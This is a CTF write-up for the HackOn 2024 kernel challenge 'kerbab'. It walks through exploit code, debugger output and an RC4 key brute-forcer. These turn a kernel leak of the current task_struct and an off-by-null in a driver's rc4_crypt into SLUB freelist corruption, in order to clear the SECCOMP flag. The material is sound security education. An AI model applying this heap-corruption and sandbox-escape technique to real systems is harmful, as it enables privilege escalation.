# kerbab

## TL;DR
Craft a malicious .so  to exploit an off-by-null vuln into off-by-one in SLUB to overwrite ``current->thread_info.flags`` to disable SECCOMP and read the flag.

## Challenge Description
This challenge was part of HackOn 2024 CTF
- Category: **pwn**

## Exploitation
### Initial setup
We are given a list of common files in kernel exploitation challenges:

```console
lkt@pwn:~/Desktop/ctf/kerbab$ ls -l
total 12240
-rw-rw-r-- 1 lkt lkt       59 ene  3 11:48 deploy_docker.sh
-rw-rw-r-- 1 lkt lkt      155 ene  3 11:48 docker-compose.yml
-rw-rw-r-- 1 lkt lkt      618 ene  3 11:48 Dockerfile
-rw-rw-r-- 1 lkt lkt  2497982 ene  3 11:48 initramfs.cpio.gz
-rw-rw-r-- 1 lkt lkt     6339 ene  3 11:48 kebab.c
drwxrwxr-x 7 lkt lkt     4096 ene  3 11:48 pc-bios
-rw-rw-r-- 1 lkt lkt      396 ene  3 11:48 run.sh
-rw-rw-r-- 1 lkt lkt 10000704 ene  3 11:48 vmlinuz-4.19.306
-rw-rw-r-- 1 lkt lkt      176 ene  3 11:48 xinetd
```

The most relevant files are:
- ``initramfs.cpio.gz``: holds the filesystem of the VM.
- `vmlinuz-4.19.306` is the kernel image of the VM. 
- `run.sh`: bash script to spawn the VM with qemu.
- `kebab.c`: source code of the vulnerable driver.

```bash
#!/bin/bash
qemu-system-x86_64 \
    -nographic \
    -cpu kvm64,+smep,+smap,check \
    -kernel bzImage \
    -initrd initramfs.cpio \
    -m 1024M \
    -L pc-bios/ \
    -no-reboot \
    -monitor none \
    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny \
    -append "console=ttyS0 oops=panic panic=1 quiet kaslr slub_debug=- apparmor=0" 
```

Running this file would get us a shell inside the VM. To interact with the vulnerable device we must create `exploit.c` that opens it. We can see in the .c code provided that the device is called `/dev/safe_guard`. So we create a helper function to open it in our exploit.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

static int fd;

void open_dev(){
    if ((fd = open(DEV, O_RDWR)) < 0){
        perror("[-] error opening device");
        exit(1);
    }
}

int main(int argc, char **argv){

    open_dev();

    return 0;
}

```

To compile and add our exploit we have to decompress the filesystem, move the exploit inside and recompress it in cpio format.

```bash
gunzip initramfs.cpio.gz
mkdir initramfs
cd initramfs/
cpio -idm < ../initramfs.cpio
```

Now we can modify our `run.sh` script to compress the fs with the exploit everytime we run the VM.

```bash
#! /bin/bash
set -e

gcc exploit.c -o exploit
mv exploit initramfs/
cd initramfs; find . -print0 | cpio -o --null --format=newc > ../debugfs.cpio
cd ../

qemu-system-x86_64 \
    -nographic \
    -cpu kvm64,+smep,+smap,check \
    -kernel bzImage \
    -initrd debugfs.cpio \
    -m 1024M \
    -L pc-bios/ \
    -no-reboot \
    -monitor none \
    -sandbox on,obsolete=deny,elevateprivileges=deny,spawn=deny,resourcecontrol=deny \
    -append "console=ttyS0 oops=panic panic=1 quiet kaslr slub_debug=- apparmor=0" \
    -s
```

**We set the parameter `-s` to create a gdbserver that we will connect to later to debug the kernel.**

As soon as we run our vm and execute our exploit we get an error:

```console

  ____         __       ____                     _ 
 / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |
 \___ \ / _` | |_ / _ \ |  _| | | |/ _` | '__/ _` |
  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |
 |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|
                                                   
----------------------------------------------------
[+]            By DiegoAltF4 and Dbd4            [+]
----------------------------------------------------

/home/user $ /exploit 
[-] error opening device: Permission denied
/home/user $ ls -l /dev/safe_guard 
crw-------    1 root     root       10,  57 Jan  4 15:26 /dev/safe_guard
/home/user $ 

```

We do not have permissions to open this device. Taking a look at the Dockerfile we see there is a SUID binary `run` inside a folder called ``/chall``. Looking at the decompilation with ghidra:
1. Opens `/dev/safe_guard`
2. Loads the library `/home/user/libxpl.so`
3. Looks for a function called `exploit` in the loaded library
4. Creates SECCOMP rules to allow `ioctl`, `write` and `newfstatat`
5. Calls the `exploit` function with the device file descriptor as its first parameter

To interact with the module we have to change the `main(void)` function to `exploit(int fd)` 

```c
static int fd;

void exploit(int devfd){

	fd = devfd;

	if (fd > 0){
		printf("[*] Opened device\n");
	} else { exit(1); }

}

```

Modify `run.sh` to compile it as a library:

```bash
...
gcc exploit.c -shared -fPIC -o libxpl.so
mv libxpl.so initramfs/home/user/
cd initramfs; find . -print0 | cpio -o --null --format=newc > ../debugfs.cpio
cd ../
...
```

And now if we spawn the VM and execute `/chall/run` we can see it works properly and opens the device. The **bad system call** is most likely because of system calls that are used in the exiting of the binary.

```console

  ____         __       ____                     _ 
 / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |
 \___ \ / _` | |_ / _ \ |  _| | | |/ _` | '__/ _` |
  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |
 |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|
                                                   
----------------------------------------------------
[+]            By DiegoAltF4 and Dbd4            [+]
----------------------------------------------------

/home/user $ /chall/run 
[*] Opened device
Bad system call
/home/user $
```

### Analyzing the source code

The driver works as a safe storage, we can send data and it will get RC4 encrypted and stored in chunks in the kernel heap. It uses the following structures:

```c

struct secure_buffer {
	char *buffer;
	size_t size;
};

struct new_secbuff_arg {
	size_t size;
	char key[MAX_RC4_LEN];
	const char *buffer;
};

struct read_secbuff_arg {
	unsigned long index;
	char key[MAX_RC4_LEN];
	char *buffer;
};

struct key_info{
	int pid;
	struct task_struct *cur;
	size_t max_len;
};
```

- `struct secure_buffer`: it is stored in the kernel heap too (kmalloc-16), and saves the pointer to the encrypted user data, and its size.
- `struct new_secbuff_arg`: structure used to send data to the kernel device, the `size` of the data, RC4 `key` and the buffer with the not yet encrypted data.
- `struct read_secbuff_arg`: structure used to read data from the kernel, we don't use this in our exploit. It is the same as `new_secbuff_arg` but with an `index` field. It looks for that index in the global list and fills our buffer with its `secure_buffer.size` value.
- `struct key_info`: this is one of the main bugs in this module. The `key_info` structure holds a pointer to the current `task_struct`, this struct has all the relevant information about the current process (including SECCOMP flags, UID, GID, etc.). 
- Other RC4 encryption structures...

We can interact with the driver using the `ioctl` syscall. With the syntax `ioctl(fd, PARAMETER, arg)`, ``arg`` will be a pointer to one of the structs described above and depending of `PARAMETER` it will do one of the following:

- `KEBAB_IOCTL_NEW`: Creates a total of 3 allocations; the first will be `secure_buffer` to hold the pointer and the size, the second will be an allocation of n bytes provided by the user, it gets stored in `secure_buffer.buffer`. And the last one is an intermediate big allocation of size 2048 to hold the unencrypted user data before encrypting it. This is the buffer the RC4 functions will use to access to the original bytes.
- `KEBAB_IOCTL_READ`: Looks in the global array of buffers for the index provided and prints out `secure_buffer.size` bytes.
- `KEBAB_IOCTL_SET_KEY`: Small function to set the global variable `RC4_key` (the key used for the RC4 encryption). After setting the key, fills the `struct key_info` with the current PID, the size of the key and a pointer to the ``task_struct current`` (important kernel address leak).

The value of each parameter is defined at the top of the file

```c
#define KEBAB_IOCTL_NEW       0xFABADA
#define KEBAB_IOCTL_READ      0xBEBE
#define KEBAB_IOCTL_SET_KEY   0x1CAFE
```

### Spotting the vulnerability

There is a big leak in `KEBAB_IOCTL_SET_KEY`, they provide us with ``current`` pointer. At the moment, we execute `/chall/run` as root because of SUID perms, but we cannot open the flag because of SECCOMP rules. There is a flag called `_TIF_SECCOMP`, that is on if SECCOMP is enabled, if we could zero out this flag somehow we could disable SECCOMP and read the flag or even spawn a shell. This flag is stored at `current->thread_info.flags`, which happens to be the first 8 bytes of the `task_struct`. So having now our leak, if we zero out the address we are given, we will break out of the restricted environment. Source [task_struct definition](https://elixir.bootlin.com/linux/v6.18.3/source/include/linux/sched.h#L819), and [thread_info](https://elixir.bootlin.com/linux/v6.18.3/source/arch/arc/include/asm/thread_info.h#L38).

The global `RC4_key` variable is defined at the top of the file along with the other structures: `static char RC4_key[MAX_RC4_LEN + 1] = {0};` it is sized `MAX_RC4_LEN + 1`!
The encrypting function that does the heavy lifting is `rc4_crypt`:

```c
void rc4_crypt(struct rc4_state *const state, const unsigned char *inbuf, unsigned char *outbuf, int buflen)
{
	int i;
	unsigned char j;

	for (i = 0; i <= buflen; i++) { /* !!!! */

		state->index1++;
		state->index2 += state->perm[state->index1];

		swap_bytes(&state->perm[state->index1],
		    &state->perm[state->index2]);

		j = state->perm[state->index1] + state->perm[state->index2];
		outbuf[i] = inbuf[i] ^ state->perm[j];
	}
}
```

The function is looping for 1 more iteration that it should, for a 16 byte buffer, it is starting at index 0 and the last iteration will be at index 16! **Off-by-one vuln**
In this case it is actually an **off-by-null**, because for a 16 byte buffer it is taking one more byte, that in the case of this module always happens to be 0.

Now we will debug the module to see how is this affecting to the kernel heap. But first we create some helper functions to interact with the driver.

> **NOTE:** I copied every needed structure and every macro from the module, including parameters, sizes, etc.

```c

static char key_buf[MAX_RC4_LEN] = {0x41};
static char leak_buf[MAX_RC4_LEN] = {0};
static key_info leak = {0};

static void logleak(char *__s, unsigned long addr){
	printf("[*] %s : %#lx\n", __s, addr);
}

static void create_buf(int size, char *buf){

	struct new_secbuff_arg arg = {
		.size = size,
		.buffer = buf
	};

	memcpy(arg.key, key_buf, MAX_RC4_LEN);

	ioctl(fd, KEBAB_IOCTL_NEW, &arg);
}

static void read_buf(unsigned long index, char *buf){
	struct read_secbuff_arg arg = {
		.index = index,
		.buffer = buf
	};

	memcpy(arg.key, key_buf, MAX_RC4_LEN);
}

static void set_key(void){
	memcpy(leak_buf, key_buf, MAX_RC4_LEN);
	
	if(ioctl(fd, KEBAB_IOCTL_SET_KEY, leak_buf) < 0 ){
		printf("[-] Error setting the key\n");
	}

	memcpy(&leak, leak_buf, sizeof(key_info));
}

```

First we will retrieve our important leak and save it in a global variable `current`;

```c
set_key();
unsigned long current = (unsigned long)leak.cur;
logleak("task_struct current", current);
logleak("PID", (unsigned long)leak.pid);
```

And then we create a new 16 byte secure buffer by sending a bunch of A's.

```c
char A[0x10] = "AAAAAAAAAAAAAAAA";
create_buf(sizeof(A), A);
```

For the debugging im using [gef](https://github.com/bata24/gef) plugin for GDB, it has useful kernel debugging utilities.
We can use the command `vmlinux-to-elf` to generate an ELF binary with symbols from the kernel image, this binary is what we will use to debug with GDB, `vmlinux-to-elf vmlinuz-4.19.306 vmlinux`.  
We run the VM and connect with GDB `gdb vmlinux` and once we are in, `target remote :1234`. Don't forget to disable KASLR in `run.sh` file, this can be done changing the ``kaslr`` keyword to `nokaslr`. This way we can debug easily with only 1 import of the symbols. After connecting to the remote instance we can check the kernel base address with `kbase` and set up the symbols with ``add-symbol-file vmlinux kbase``. Using vmmap we check the base address of the module

```c
0xffffffffc0002000-0xffffffffc0003000 0x0000000000001000 [r-x] modules, kernel module (kebab)
0xffffffffc0003000-0xffffffffc0004000 0x0000000000001000 [r--] modules, kernel module (kebab)
0xffffffffc0004000-0xffffffffc0006000 0x0000000000002000 [rw-] modules, kernel module (kebab)
```

We can add the module symbols the same way `add-symbol-file initramfs/chall/kebab_mod.ko 0xffffffffc0002000`. We will place 2 breakpoints, in the kmalloc we are interested in (the one used to store the encrypted data), and one after the encryption to see how it got filled.

![alt text](kmalloc.png)

Now with a single ``stepover`` we can check `$rax` to see the pointer to the new chunk. We placed a breakpoint at the end of `rc4_crypt` to look at the chunk.
This is **before** the encryption:

```c
gef> x/4gx $rax
0xffff88803db71930:	0x0000000000000000	0x0000000000000000
0xffff88803db71940:	0xffff88803db71950	0x0000000000000000 <-- The pointer 0xffff88803db71950 is the next free chunk in the freelist 
```

**After** `rc4_crypt`

```c
gef> x/4gx 0xffff88803db71930
0xffff88803db71930:	0xe08ce2817ca78a83	0x6a74b1a51d28eafb
0xffff88803db71940:	0xffff88803db71977	0x0000000000000000
```

The next pointer's last byte got modified to 0x77.

The kernel heap has caches por each size of allocations, for example an allocation of 1000 bytes would be in `kmalloc-1k` cache, one of 30 bytes to `kmalloc-32`, etc. In this case we are allocating objects of size 16 so our object ends up in kmalloc-16, we can easily verify this with gef's command `slab-contains 0xffff88803db71930`

```c
gef> slab-contains 0xffff88803db71930
[+] Wait for memory scan
page: 0xffffea0000f6dc40
kmem_cache: 0xffff88803e001a80
base: 0xffff88803db71000
name: kmalloc-16  size: 0x10  num_pages: 0x1
```

In this kernel version, the chunks are ordered and are allocated sequentially one after the other:

```c
gef> slub-dump kmalloc-16

...
0x091 0xffff88803db71910 (in-use)
0x092 0xffff88803db71920 (in-use)
0x093 0xffff88803db71930 (in-use)
0x094 0xffff88803db71940 (next: 0xffff88803db71950)
0x095 0xffff88803db71950 (next: 0xffff88803db71960)
0x096 0xffff88803db71960 (next: 0xffff88803db71970)
...

```

Each free chunk has the address of the next chunk to be allocated. If we somehow tamper this next pointer to point to itself, we can create a loop where we allocate on top of this next pointer, and we can change it with anything we want. In this case, we could change it to the address of `current`!
Our data chunk is always falling into ``0xffff88803db71930``, and we have an off-by-one into `0xffff88803db71940`'s next pointer, if we manage to find a key that when the 16th byte is 0, the result of the encryption is 0x40 we will successfully create a loop.

Cryptography is definitely not my field, so I had some trouble understanding how it worked. But RC4 is not a secure algorithm, and it can be easily reversed. So if we get an output from `enc(key, message)`, if we now `enc(cipher, message)` we will get the key back. So knowing this I created a [python script](assets/rc4.py) that bruteforces this problem:

```python
from Crypto.Cipher import ARC4
from pwn import *

def brute(b: int):
    for i in range(0xfff):
        key = p16(i) 
        length = 1
        cipher = ARC4.new(key)
        buf = b'A' * 16 + b'\x00'
        msg = cipher.encrypt(buf)
        if msg[16] == b:
            c_arr = ", ".join([f"0x{b:02x}" for b in key])
            print("static char key_buf[MAX_RC4_LEN] = {", c_arr, " };")

brute(0x40)

```

This produced the key 0x35, but for some reason I still don't know, it does not work, so I chose the next key 0x1dd.

```console
lkt@pwn:~/Desktop/ctf/kerbab/kerbab$ python3 rc4.py 
static char key_buf[MAX_RC4_LEN] = { 0x35, 0x00  };
static char key_buf[MAX_RC4_LEN] = { 0xdd, 0x01  };
...
```
